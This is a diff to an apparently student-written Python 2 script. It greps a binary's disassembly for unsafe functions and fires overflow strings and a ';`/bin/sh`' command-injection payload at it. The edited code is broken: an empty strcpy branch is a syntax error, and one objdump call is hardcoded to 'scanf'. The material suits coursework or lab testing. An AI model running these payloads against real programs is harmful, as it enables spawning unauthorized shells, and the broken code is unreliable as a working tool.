@@ -38,7 +38,7 @@ def inject_scanf(buffers):
 
 def gets_exploit(buf_size):
     exploit = "\x90" * buf_size
-    result = os.system("echo " + exploit + " > exploit.txt && ./" + sys.argv[1] + " $(cat exploit.txt)")
+    result = os.system("echo " + exploit + " > exploit.txt && ./" + inputFile + " $(cat exploit.txt)")
     if result != 0:
         print "Success"
     else:
@@ -47,7 +47,7 @@ def gets_exploit(buf_size):
 
 def scanf_exploit(buf_size):
     exploit = "1" * buf_size
-    result = os.system("echo " + exploit + " > exploit.txt && ./" + sys.argv[1])
+    result = os.system("echo " + exploit + " > exploit.txt && ./" + inputFile)
     if result != 0:
         print "Success"
     else:
@@ -56,23 +56,26 @@ def scanf_exploit(buf_size):
 
 def inject_execl():
     exploit = ";`/bin/sh`"
-    os.system("echo " + exploit + " > exploit.txt && ./" + sys.argv[1] + " $(cat exploit.txt)")
+    os.system("echo " + exploit + " > exploit.txt && ./" + inputFile + " $(cat exploit.txt)")
 
+
+if len(sys.argv) > 1:
+    inputFile = sys.argv[1]
+else:
+    sys.exit("Please pass a file as an argument.")
 
 # added access function
-vulnerabilities = filter(None, os.popen('objdump -M Intel -d ' + sys.argv[
-    1] + ' | grep -oP "(gets|scanf|strcpy|memcpy|printf|system|fgets|gets|execl|access)"').read().split('\n'))
+vulnerabilities = filter(None, os.popen('objdump -M Intel -d ' + inputFile + ' | grep -oP "(gets|scanf|strcpy|memcpy|printf|system|fgets|gets|execl|access)"').read().split('\n'))
 vulnerabilities = list(set(filter(None, vulnerabilities)))
 
 print "Team 7 below is the list of suspected vulnerabilites to look at:\n" + str(vulnerabilities)
 
-
-#buffers = filter(None,os.popen('objdump -d ' +sys.argv[1]+ ' | grep -oP "(?<=buf    .)....(?=,%esp)"').read()).split('\n')	
-#buffers.sort()
-#buffers = list(set(filter(None, buf)))
-buffers= os.popen('objdump -d '+sys.argv[1]+  ' | grep -P "^<*(?=.*(>:))"').read()
-buffers= buffers.split("\n")
-buffers= list(filter(lambda x: not "@" in x, buffers))
+# buffers = filter(None,os.popen('objdump -d ' +inputFile+ ' | grep -oP "(?<=buf    .)....(?=,%esp)"').read()).split('\n')
+# buffers.sort()
+# buffers = list(set(filter(None, buf)))
+buffers = os.popen('objdump -d scanf | grep -P "^<*(?=.*(>:))"').read()
+buffers = buffers.split("\n")
+buffers = list(filter(lambda x: not "@" in x, buffers))
 buffers.sort()
 print(buffers)
 buffers = list(set(filter(None, buffers)))
@@ -85,6 +88,8 @@ for suspect_func in vulnerabilities:
     elif suspect_func == "scanf":
         inject_scanf(buffers)
         break
+    elif suspect_func == "strcpy":
+
     elif suspect_func == "execl":
         inject_execl()
         break
